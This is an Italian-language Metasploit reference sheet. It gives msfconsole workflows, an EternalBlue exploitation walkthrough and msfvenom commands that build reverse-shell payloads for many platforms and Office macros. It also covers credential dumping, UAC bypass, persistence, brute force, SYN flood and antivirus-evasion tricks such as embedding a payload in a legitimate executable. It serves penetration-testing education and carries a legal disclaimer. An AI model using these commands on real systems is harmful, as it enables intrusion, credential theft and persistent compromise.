# 🔴 Metasploit Framework - Scheda di riferimento completa

<!-- language-home-navigation -->
[🏠 Pagina iniziale italiana](../../README.it.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

```
                                   ___          ____
                               ,-""   `.      < HACK >
                             ,'  _   e )`-._ /  ----
                            /  ,' `-._<.===-'
                           /  /
                          /  ;
              _.--.__    /   ;
 (`._    _.-""       "--'    |
 <_  `-""                     \
  <`-                          :
   (__   <__.                  ;
     `-.   '-.__.      _.'    /
        \      `-.__,-'    _,'
         `._    ,    /__,-'
            ""._\__,'< <____
                 | |  `----.`.
                 | |        \ `.
                 ; |___      \-``
                 \   --<
                  `.`.<
                    `-'
```

![Metasploit](https://img.shields.io/badge/Metasploit-Framework-blue?style=for-the-badge&logo=metasploit)
![Kali Linux](https://img.shields.io/badge/Kali-Linux-557C94?style=for-the-badge&logo=kalilinux&logoColor=white)
![Offensive Security](https://img.shields.io/badge/Offensive-Security-red?style=for-the-badge)
![License](https://img.shields.io/badge/License-BSD--3-green?style=for-the-badge)

> **Il framework di penetration testing più utilizzato al mondo** - Una guida completa per padroneggiare Metasploit

> **Nota sugli esempi originali:** conteggi dei moduli, nomi, percorsi e opzioni dipendono dalla versione. Gli encoder trasformano il payload ma non garantiscono l’elusione degli antivirus ([chiarimento Rapid7](https://docs.rapid7.com/metasploit/encoded-payloads-bypassing-anti-virus/)). L’esempio `php_file_upload` non è un exploit universale per qualsiasi caricamento di file; anche `db_import`, i moduli post e gli script legacy richiedono verifica nella versione installata. `msfdb reinit` può ricreare il database: prima di usarlo occorre considerare i dati esistenti.

---

## 📋 Indice

- [Introduzione](#-introduzione)
- [Installazione](#-installazione)
- [Panoramica dell'architettura](#-panoramica-dellarchitettura)
- [Avvio di Metasploit](#-avvio-di-metasploit)
- [Comandi di base](#-comandi-di-base)
- [Tipi di moduli](#-tipi-di-moduli)
- [Procedura di sfruttamento](#-procedura-di-sfruttamento)
- [Integrazione con il database](#-integrazione-con-il-database)
- [Scansione ed enumerazione](#-scansione-ed-enumerazione)
- [Generazione dei payload (msfvenom)](#-generazione-dei-payload-msfvenom)
- [Post-exploitation](#-post-exploitation)
- [Moduli ausiliari](#-moduli-ausiliari)
- [Esempi pratici](#-esempi-pratici)
- [Tabelle di riferimento rapido](#-tabelle-di-riferimento-rapido)
- [Consigli e buone pratiche](#-consigli-e-buone-pratiche)
- [Risorse](#-risorse)

---

## 🎯 Introduzione

**Metasploit Framework** è una piattaforma open source per il penetration testing e lo sviluppo di exploit. Offre:

- 🔍 **Raccolta di informazioni** e scansione delle vulnerabilità
- 💉 **Sviluppo e distribuzione di exploit**
- 🎭 **Generazione di payload** per diverse piattaforme
- 🔐 Strumenti e tecniche di **post-exploitation** (attività successive all'accesso)
- 📊 Funzioni di **reportistica** e documentazione

### Componenti principali

| Componente | Descrizione |
|-----------|-------------|
| `msfconsole` | Interfaccia principale a riga di comando |
| `msfvenom` | Generatore e codificatore di payload |
| `msfdb` | Utilità di gestione del database |
| `msfrpcd` | Demone RPC per l'accesso remoto |

---

## 📥 Installazione

### Kali Linux (preinstallato)
```bash
# Aggiorna Metasploit
sudo apt update && sudo apt install metasploit-framework
```

### Ubuntu/Debian
```bash
# Installa le dipendenze
sudo apt install curl gnupg2 software-properties-common

# Aggiungi il repository Metasploit
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
chmod 755 msfinstall
./msfinstall
```

### Docker
```bash
docker pull metasploitframework/metasploit-framework
docker run --rm -it metasploitframework/metasploit-framework ./msfconsole
```

### Windows (sconsigliato per l'uso in produzione)
```powershell
# Scarica il programma di installazione da: https://windows.metasploit.com/
# Esegui il programma di installazione e segui le istruzioni
```

---

## 🏗 Panoramica dell'architettura

```
┌─────────────────────────────────────────────────────────────┐
│                    METASPLOIT FRAMEWORK                      │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│  ┌──────────┐  ┌──────────┐  ┌──────────┐  ┌──────────┐    │
│  │ EXPLOITS │  │ PAYLOADS │  │AUXILIARY │  │   POST   │    │
│  │  (~2000) │  │  (~500)  │  │  (~1000) │  │  (~400)  │    │
│  └──────────┘  └──────────┘  └──────────┘  └──────────┘    │
│                                                              │
│  ┌──────────┐  ┌──────────┐  ┌──────────┐  ┌──────────┐    │
│  │ ENCODERS │  │   NOPS   │  │ EVASION  │  │ PLUGINS  │    │
│  └──────────┘  └──────────┘  └──────────┘  └──────────┘    │
│                                                              │
├─────────────────────────────────────────────────────────────┤
│                          INTERFACCE                          │
│  ┌──────────┐  ┌──────────┐  ┌──────────┐  ┌──────────┐    │
│  │msfconsole│  │ Armitage │  │   API    │  │   RPC    │    │
│  └──────────┘  └──────────┘  └──────────┘  └──────────┘    │
├─────────────────────────────────────────────────────────────┤
│                 DATABASE (PostgreSQL)                        │
└─────────────────────────────────────────────────────────────┘
```

### Struttura delle directory
```
/usr/share/metasploit-framework/
├── modules/
│   ├── exploits/      # Moduli di sfruttamento delle vulnerabilità
│   ├── payloads/      # Moduli dei payload
│   ├── auxiliary/     # Scansione, fuzzing e altre attività
│   ├── post/          # Post-exploitation
│   ├── encoders/      # Codificatori di payload
│   ├── nops/          # Generatori di NOP
│   └── evasion/       # Moduli di elusione degli antivirus
├── tools/             # Strumenti aggiuntivi
├── scripts/           # Script Meterpreter
├── data/              # Liste di parole e modelli
└── plugins/           # Plugin della console
```

---

## 🚀 Avvio di Metasploit

### Inizializza il database (prima esecuzione)
```bash
# Avvia il servizio PostgreSQL
sudo systemctl start postgresql

# Inizializza il database
sudo msfdb init

# Verifica lo stato del database
sudo msfdb status
```

### Avvia msfconsole
```bash
# Avvio standard
msfconsole

# Modalità silenziosa (senza banner)
msfconsole -q

# Esegui comandi all'avvio
msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.1.100"

# Carica un file di risorse
msfconsole -r commands.rc
```

---

## ⌨ Comandi di base

### Navigazione e guida

| Comando | Descrizione |
|---------|-------------|
| `help` oppure `?` | Visualizza il menu della guida |
| `help <command>` | Guida per un comando specifico |
| `search <term>` | Cerca moduli per nome, CVE o piattaforma |
| `use <module>` | Seleziona un modulo |
| `back` | Esci dal modulo corrente |
| `info` | Visualizza le informazioni sul modulo |
| `show options` | Mostra le opzioni del modulo |
| `show advanced` | Mostra le opzioni avanzate |
| `show payloads` | Elenca i payload compatibili |
| `show targets` | Elenca i bersagli disponibili |

### Configurazione dei moduli

```bash
# Imposta le opzioni
set RHOSTS 192.168.1.100          # IP del bersaglio
set RPORT 445                      # Porta del bersaglio
set LHOST 192.168.1.50            # IP locale (del tester)
set LPORT 4444                     # Porta locale (del listener)
set PAYLOAD windows/meterpreter/reverse_tcp

# Imposta globalmente (mantiene il valore tra i moduli)
setg RHOSTS 192.168.1.100
setg LHOST 192.168.1.50

# Rimuovi le opzioni
unset RHOSTS
unsetg LHOST

# Verifica le impostazioni correnti
show options
check                              # Verifica se il bersaglio è vulnerabile
```

### Esecuzione

```bash
# Esegui l'exploit
exploit
run

# Esegui in background
exploit -j

# Esegui con opzioni specifiche
exploit -z                         # Non interagire con la sessione dopo il successo
```

### Gestione delle sessioni

```bash
# Elenca le sessioni
sessions
sessions -l

# Interagisci con la sessione
sessions -i 1

# Termina la sessione
sessions -k 1

# Termina tutte le sessioni
sessions -K

# Converti la shell in una sessione Meterpreter
sessions -u 1

# Esegui un comando su tutte le sessioni
sessions -c "sysinfo"
```

---

## 📦 Tipi di moduli

### 1. Exploit
Moduli che sfruttano le vulnerabilità.

```bash
# Cerca gli exploit
search type:exploit platform:windows

# Esempio
use exploit/windows/smb/ms17_010_eternalblue
```

### 2. Payload
Codice eseguito dopo il successo dello sfruttamento.

**Tipi:**
- **Singles** - Payload autonomi
- **Stagers** - Stabiliscono la connessione tra il tester e il bersaglio
- **Stages** - Componenti scaricati dagli stager (Meterpreter)

```bash
# Elenca i payload
show payloads

# Convenzione dei nomi dei payload
<platform>/<arch>/<type>/<connection>
# Esempio: windows/x64/meterpreter/reverse_tcp
```

### 3. Moduli ausiliari (Auxiliary)
Scansione, fuzzing, intercettazione del traffico e altre attività.

```bash
search type:auxiliary
use auxiliary/scanner/portscan/tcp
```

### 4. Post
Moduli di post-exploitation.

```bash
search type:post platform:windows
use post/windows/gather/hashdump
```

### 5. Codificatori (Encoders)
Codificano i payload per tentare di eludere il rilevamento.

```bash
show encoders
# Esempio: x86/shikata_ga_nai
```

---

## 🎯 Procedura di sfruttamento

```
┌──────────────┐    ┌──────────────┐    ┌──────────────┐
│ RICOGNIZIONE │───▶│    SCEGLI    │───▶│  CONFIGURA   │
│ ENUMERAZIONE │    │    MODULO    │    │   OPZIONI    │
└──────────────┘    └──────────────┘    └──────────────┘
                                               │
                                               ▼
┌──────────────┐    ┌──────────────┐    ┌──────────────┐
│    POST-     │◀───│   SFRUTTA    │◀───│   VERIFICA   │
│ SFRUTTAMENTO │    │  BERSAGLIO   │    │  BERSAGLIO   │
└──────────────┘    └──────────────┘    └──────────────┘
```

### Esempio passo per passo

```bash
# 1. Cerca un exploit
msf6 > search eternalblue

# 2. Seleziona il modulo
msf6 > use exploit/windows/smb/ms17_010_eternalblue

# 3. Visualizza le opzioni
msf6 exploit(ms17_010_eternalblue) > show options

# 4. Imposta il bersaglio
msf6 exploit(ms17_010_eternalblue) > set RHOSTS 192.168.1.100

# 5. Imposta il payload
msf6 exploit(ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_tcp

# 6. Configura il listener
msf6 exploit(ms17_010_eternalblue) > set LHOST 192.168.1.50
msf6 exploit(ms17_010_eternalblue) > set LPORT 4444

# 7. Verifica la vulnerabilità (facoltativo)
msf6 exploit(ms17_010_eternalblue) > check

# 8. Esegui
msf6 exploit(ms17_010_eternalblue) > exploit
```

---

## 🗄 Integrazione con il database

### Configurazione e connessione

```bash
# Inizializza il database
msfdb init

# Collegati al database
db_connect msf:password@127.0.0.1/msf

# Verifica lo stato
db_status

# Disconnetti
db_disconnect
```

### Gestione degli spazi di lavoro

```bash
# Elenca gli spazi di lavoro
workspace

# Crea uno spazio di lavoro
workspace -a pentest_project

# Cambia spazio di lavoro
workspace pentest_project

# Elimina lo spazio di lavoro
workspace -d old_project

# Rinomina lo spazio di lavoro
workspace -r old_name new_name
```

### Gestione degli host

```bash
# Elenca gli host
hosts

# Aggiungi manualmente un host
hosts -a 192.168.1.100

# Elimina un host
hosts -d 192.168.1.100

# Cerca gli host
hosts -S windows

# Esporta gli host
hosts -o /tmp/hosts.csv
```

### Gestione dei servizi

```bash
# Elenca i servizi
services

# Filtra per porta
services -p 80,443

# Filtra per nome del servizio
services -s http

# Cerca i servizi
services -S microsoft
```

### Gestione delle vulnerabilità

```bash
# Elenca le vulnerabilità
vulns

# Aggiungi una vulnerabilità
vulns -a 192.168.1.100 -n "MS17-010"
```

### Importazione ed esportazione

```bash
# Importa una scansione Nmap
db_import /path/to/nmap_scan.xml

# Importa una scansione Nessus
db_import /path/to/nessus_scan.nessus

# Esegui direttamente Nmap
db_nmap -sV -O 192.168.1.0/24

# Esporta i dati
hosts -o hosts.csv
services -o services.csv
```

---

## 🔍 Scansione ed enumerazione

### Scansione delle porte

```bash
# Scansione TCP SYN
use auxiliary/scanner/portscan/syn
set RHOSTS 192.168.1.0/24
set PORTS 1-1000
run

# Scansione TCP connect
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.1.100
set PORTS 1-65535
set THREADS 50
run
```

### Enumerazione dei servizi

```bash
# Enumerazione SMB
use auxiliary/scanner/smb/smb_version
set RHOSTS 192.168.1.0/24
run

# Condivisioni SMB
use auxiliary/scanner/smb/smb_enumshares
set RHOSTS 192.168.1.100
run

# Versione SSH
use auxiliary/scanner/ssh/ssh_version
set RHOSTS 192.168.1.0/24
run

# Versione HTTP
use auxiliary/scanner/http/http_version
set RHOSTS 192.168.1.0/24
run

# Enumerazione FTP
use auxiliary/scanner/ftp/ftp_version
set RHOSTS 192.168.1.0/24
run
```

### Scansione delle vulnerabilità

```bash
# SMB MS17-010 (EternalBlue)
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS 192.168.1.0/24
run

# Scanner di vulnerabilità HTTP
use auxiliary/scanner/http/http_vuln_cve_2021_26855
set RHOSTS 192.168.1.100
run
```

---

## 💉 Generazione dei payload (msfvenom)

### Sintassi di base
```bash
msfvenom -p <PAYLOAD> <OPTIONS> -f <FORMAT> -o <OUTPUT>
```

### Opzioni comuni

| Opzione | Descrizione |
|--------|-------------|
| `-p` | Payload da utilizzare |
| `-f` | Formato di output |
| `-o` | File di output |
| `-e` | Codificatore da utilizzare |
| `-i` | Iterazioni di codifica |
| `-b` | Caratteri da evitare (bad characters) |
| `-n` | Dimensione della sequenza di NOP (NOP sled) |
| `--platform` | Piattaforma del bersaglio |
| `-a` | Architettura |
| `LHOST` | IP del listener |
| `LPORT` | Porta del listener |

### Payload per Windows

```bash
# Reverse TCP (Meterpreter)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe -o shell.exe

# Reverse TCP (x64)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe -o shell64.exe

# Reverse HTTPS (cifrato)
msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.50 LPORT=443 -f exe -o shell_https.exe

# Bind TCP
msfvenom -p windows/meterpreter/bind_tcp LPORT=4444 -f exe -o bind_shell.exe

# Con codifica (elusione antivirus)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o encoded_shell.exe
```

### Payload per Linux

```bash
# Reverse TCP
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f elf -o shell

# Reverse TCP (x64)
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f elf -o shell64

# Shell bind
msfvenom -p linux/x86/shell/bind_tcp LPORT=4444 -f elf -o bind_shell
```

### Payload per il web

```bash
# Reverse shell PHP
msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f raw -o shell.php

# Reverse shell ASP
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f asp -o shell.asp

# Reverse shell ASPX
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f aspx -o shell.aspx

# Reverse shell JSP
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f raw -o shell.jsp

# File WAR
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f war -o shell.war
```

### Payload per linguaggi di scripting

```bash
# Python
msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f raw -o shell.py

# PowerShell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f psh -o shell.ps1

# VBA (macro)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f vba -o shell.vba

# HTA
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f hta-psh -o shell.hta
```

### Payload per Android

```bash
# Reverse TCP per Android
msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -o app.apk
```

### Payload per macOS

```bash
# Reverse TCP per macOS
msfvenom -p osx/x64/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f macho -o shell
```

### Configurazione di Multi/Handler

```bash
# Avvia il listener
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.50
set LPORT 4444
exploit -j
```

---

## 🔓 Post-exploitation

### Moduli post di base

```bash
# Ottieni informazioni sul sistema
use post/windows/gather/enum_system

# Ottieni gli utenti connessi
use post/windows/gather/enum_logged_on_users

# Estrai gli hash delle password
use post/windows/gather/hashdump

# Credenziali dalla memoria
use post/windows/gather/credentials/credential_collector

# Verifica se si tratta di una macchina virtuale
use post/windows/gather/checkvm
```

### Escalation dei privilegi

```bash
# Suggeritore di exploit locali per Windows
use post/multi/recon/local_exploit_suggester
set SESSION 1
run

# Aggiramento di UAC
use exploit/windows/local/bypassuac_eventvwr
set SESSION 1
set PAYLOAD windows/meterpreter/reverse_tcp
exploit

# Ottieni SYSTEM
use post/windows/escalate/getsystem
```

### Persistenza

```bash
# Persistenza tramite registro
use exploit/windows/local/persistence_service
set SESSION 1
run

# Persistenza tramite attività pianificate
use post/windows/manage/persistence_exe
set SESSION 1
set STARTUP SYSTEM
run
```

---

## 🔧 Moduli ausiliari

### Tentativi sistematici (brute force)

```bash
# Brute force SSH
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 192.168.1.100
set USERNAME root
set PASS_FILE /usr/share/wordlists/rockyou.txt
set THREADS 10
run

# Brute force SMB
use auxiliary/scanner/smb/smb_login
set RHOSTS 192.168.1.100
set SMBUser administrator
set PASS_FILE /usr/share/wordlists/rockyou.txt
run

# Brute force FTP
use auxiliary/scanner/ftp/ftp_login
set RHOSTS 192.168.1.100
set USERNAME anonymous
set PASS_FILE /usr/share/wordlists/rockyou.txt
run
```

### Intercettazione del traffico (sniffing)

```bash
# Intercettazione delle password HTTP
use auxiliary/sniffer/psnuffle
run

# Cattura i pacchetti
use auxiliary/sniffer/capture
set INTERFACE eth0
run
```

### DoS (solo per test)

```bash
# SYN flood
use auxiliary/dos/tcp/synflood
set RHOSTS 192.168.1.100
set RPORT 80
run
```

---

## 🎬 Esempi pratici

### Esempio 1: attacco EternalBlue (MS17-010)

```bash
# Avvia Metasploit
msfconsole -q

# Cerca un exploit
search eternalblue

# Utilizza l'exploit
use exploit/windows/smb/ms17_010_eternalblue

# Configura
set RHOSTS 192.168.1.100
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.50
set LPORT 4444

# Verifica se è vulnerabile
check

# Exploit
exploit
```

### Esempio 2: attacco a un'applicazione web

```bash
# Cerca vulnerabilità
use auxiliary/scanner/http/dir_scanner
set RHOSTS 192.168.1.100
set DICTIONARY /usr/share/wordlists/dirb/common.txt
run

# Sfrutta il caricamento di file
use exploit/multi/http/php_file_upload
set RHOSTS 192.168.1.100
set TARGETURI /uploads/
set PAYLOAD php/meterpreter/reverse_tcp
set LHOST 192.168.1.50
exploit
```

### Esempio 3: Multi-Handler con msfvenom

```bash
# Terminale 1: genera il payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe -o payload.exe

# Terminale 2: avvia l'handler
msfconsole -q
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.50
set LPORT 4444
exploit -j

# Trasferisci payload.exe sul bersaglio ed eseguilo
# La sessione si collegherà all'handler
```

### Esempio 4: pivoting attraverso un host compromesso

```bash
# Dopo aver ottenuto una sessione Meterpreter
meterpreter > run autoroute -s 10.10.10.0/24

# Oppure da msfconsole
use post/multi/manage/autoroute
set SESSION 1
set SUBNET 10.10.10.0
run

# Ora esegui la scansione della rete interna
use auxiliary/scanner/portscan/tcp
set RHOSTS 10.10.10.0/24
set PORTS 22,80,445
run
```

---

## 📊 Tabelle di riferimento rapido

### Comandi essenziali

| Comando | Descrizione |
|---------|-------------|
| `search <term>` | Cerca i moduli |
| `use <module>` | Seleziona il modulo |
| `show options` | Visualizza le opzioni |
| `set <opt> <val>` | Imposta il valore dell'opzione |
| `exploit` / `run` | Esegui il modulo |
| `back` | Esci dal modulo corrente |
| `sessions -l` | Elenca le sessioni |
| `sessions -i <id>` | Interagisci con la sessione |

### Payload comuni

| Payload | Descrizione |
|---------|-------------|
| `windows/meterpreter/reverse_tcp` | Meterpreter per Windows (32 bit) |
| `windows/x64/meterpreter/reverse_tcp` | Meterpreter per Windows (64 bit) |
| `windows/meterpreter/reverse_https` | Connessione cifrata |
| `linux/x86/meterpreter/reverse_tcp` | Meterpreter per Linux |
| `php/meterpreter/reverse_tcp` | Meterpreter per PHP |
| `java/jsp_shell_reverse_tcp` | Shell Java/JSP |
| `android/meterpreter/reverse_tcp` | Meterpreter per Android |

### Formati di output (msfvenom)

| Formato | Estensione | Caso d'uso |
|--------|-----------|----------|
| `exe` | .exe | Eseguibile Windows |
| `elf` | (nessuna) | Eseguibile Linux |
| `macho` | (nessuna) | Eseguibile macOS |
| `raw` | variabile | Shellcode grezzo |
| `asp` | .asp | Server web IIS |
| `aspx` | .aspx | Server web .NET |
| `php` | .php | Server web PHP |
| `jsp` | .jsp | Server web Java |
| `war` | .war | Distribuzione su Tomcat |
| `psh` | .ps1 | Script PowerShell |
| `vba` | .vba | Macro di Office |
| `dll` | .dll | Libreria Windows |

### Codificatori più usati

| Codificatore | Descrizione |
|---------|-------------|
| `x86/shikata_ga_nai` | Codificatore XOR polimorfico |
| `x64/xor` | Codificatore XOR (64 bit) |
| `x86/alpha_mixed` | Codificatore alfanumerico |
| `php/base64` | Codificatore PHP Base64 |

---

## 💡 Consigli e buone pratiche

### ⚠ Avvertenza legale
> **IMPORTANTE:** utilizza Metasploit soltanto sui sistemi di tua proprietà o per i quali hai un'esplicita autorizzazione scritta al test. L'accesso non autorizzato ai sistemi informatici è illegale.

### Consigli sulle prestazioni

1. **Utilizza il database**
   ```bash
   # Inizializza e utilizza sempre il database
   msfdb init
   db_status
   ```

2. **Utilizza gli spazi di lavoro**
   ```bash
   workspace -a client_pentest
   ```

3. **Script di risorse**
   ```bash
   # Salva i comandi in un file .rc
   echo "use exploit/multi/handler
   set PAYLOAD windows/meterpreter/reverse_tcp
   set LHOST 192.168.1.50
   set LPORT 4444
   exploit -j" > handler.rc
   
   # Esegui lo script
   msfconsole -r handler.rc
   ```

4. **Utilizza i thread con criterio**
   ```bash
   set THREADS 10  # Non sovraccaricare il bersaglio
   ```

### Tecniche di elusione

1. **Codifiche multiple**
   ```bash
   msfvenom -p windows/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=4444 -e x86/shikata_ga_nai -i 10 -f exe
   ```

2. **Modelli personalizzati**
   ```bash
   msfvenom -p windows/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=4444 -x /path/to/legitimate.exe -f exe
   ```

3. **Utilizza payload HTTPS**
   ```bash
   set PAYLOAD windows/meterpreter/reverse_https
   ```

### Risoluzione dei problemi

| Problema | Soluzione |
|-------|----------|
| Il database non si collega | `msfdb reinit` |
| Il modulo non si carica | `reload_all` |
| La sessione termina immediatamente | Verifica l'antivirus, utilizza un payload codificato |
| L'exploit non riesce | Verifica la versione del sistema operativo del bersaglio e prova un bersaglio differente |

---

## 📚 Risorse

### Documentazione ufficiale
- [Documentazione di Metasploit](https://docs.metasploit.com/)
- [Blog Rapid7](https://www.rapid7.com/blog/)
- [Metasploit su GitHub](https://github.com/rapid7/metasploit-framework)

### Risorse per l'apprendimento
- [Offensive Security](https://www.offensive-security.com/)
- [HackTheBox](https://www.hackthebox.com/)
- [TryHackMe](https://tryhackme.com/)

### Schede di riferimento
- [Scheda Metasploit di SANS](https://www.sans.org/security-resources/sec560/misc_tools_sheet_v1.pdf)
- [Scheda Meterpreter](./Meterpreter.it.md)

---

## 📄 Licenza

Questa scheda di riferimento è fornita esclusivamente a scopo educativo. Utilizzala in modo responsabile ed etico.

---

<p align="center">
  <b>Buon hacking! 🔴</b><br>
  <i>Ricorda: da un grande potere derivano grandi responsabilità</i>
</p>
